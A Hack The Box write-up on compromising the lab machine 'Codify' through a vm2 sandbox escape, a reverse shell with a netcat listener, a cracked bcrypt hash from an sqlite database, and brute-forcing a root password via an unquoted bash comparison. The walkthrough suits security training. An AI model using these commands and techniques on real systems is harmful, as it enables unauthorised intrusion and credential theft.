---
title: Hack the box - Codify pwned!
date: 2024-02-24 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, codify, vm2 library, sqlite3, posix variable quotes]
img_path: /assets/img/posts/
---

## Machine info

![Codify](htb-codify-info.png)
*Codify info*

## Annotations

>In this article we are going to assume the following ip addresses:
>
>Local machine (attacker, local host): 10.10.16.96
>
>Target machine (victim, Codify): 10.10.11.239
{: .prompt-info}

## Enumeration

If we list the open ports in the machine, we can see that there are two open ports: 22 (ssh) and 80 (http):

`nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.239`

```
22/tcp open  ssh
80/tcp open  http
```

## Footprinting

If we look for more information about the services running in those ports we will find the machine address:

`map -Pn -n -sVC -p22,80 10.10.11.239`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We add the machine address to our `/etc/hosts`:

`echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts`

### Codify web

We browse to `http://codify.htb` to take a look at the web:

#### Codify

![Codify](htb-codify-web-codify.png)
*Codify*

#### About us

![Codify about us](htb-codify-web-about-us.png)
*Codify about us*

Here, we can see that the editor is using the [vm2 library](https://github.com/patriksimek/vm2).

#### Limitations

![Codify limitations](htb-codify-web-limitations.png)
*Codify limitations*

#### Editor

![Codify editor](htb-codify-web-editor.png)
*Codify editor*

## Foothold

As the editor is using the [vm2 library](https://github.com/patriksimek/vm2), and this project is discontinued due security issues, we let's take advantage of a [sandbox escape PoC in vm2](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) to inject a reverse shell in the editor.

We start a listener in our host:

```
nc -lvnp 1234
```

And, we inject the reverse shell in the editor:

![Codify editor reverse shell](htb-codify-web-editor-reverse-shell.png)
*Codify editor reverse shell*

### svc

Now, we get shell as the user `svc`.

```
svc@codify:~$ whoami
svc
svc@codify:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

After taking a look at the system files, in `/var/www/contact` we can find the sqlite3 database `tickets.db`.
Inside the database we will find the hashed password for the user `joshua`:

`sqlite3 tickets.db`

```
sqlite> .tables
tickets  users
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

We analyze the hash to see what type it is:

```
hashid $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
Analyzing 'a/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
[+] Cisco Type ba4c0cfe23b95aef6f5df7d0c88d6ce
```

We put the hash in the `hash.txt`file:

`echo "$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2" > hash.txt`

And, we crack the hash using `hashcat`:

```
hashcat -a 0 -m 3200 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### joshua

Now, we have a new user and password, and since seems useless on the web, we will try to connect by `ssh`:

`ssh joshua@10.10.11.239`

And we are in!

```
joshua@codify:~$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
```

We can get our user flag:

`joshua@codify:~$ cat user.txt`

After taking our flag, we need to escalate privileges, so let's take a look to see what we can do as `joshua`:

```
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

We can execute the `/opt/scripts/mysql-backup.sh` script as root, so let's take a look at the source code:

```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

Ok, we can see that the programmer forgot to quote the variables in the passwords comparision:

```bash
if [[ $DB_PASS == $USER_PASS ]]
```

So, we can exploit this in order to get the root password.
If you want to know more about the implications of forgetting to quote a variable in bash comparisons you can take a look at this **GREAT** post in [stackexchange](https://stackexchange.com/):
[security implications of forgetting to quote a variable in bash posix shells](https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells)

To bruteforce the root password I did a python script that you can see here: [bruceforcer.py](https://github.com/rubenhortas/hackthebox/blob/main/codify/bruteforcer.py)

After a while we will have our root password and we can get the system flag:

`su`

`root@codify:~# cat /root/root.txt`

## Pwned!

![Codify](htb-codify-pwned.png)
*Codify has been Pwned*

*Enjoy! ;)*
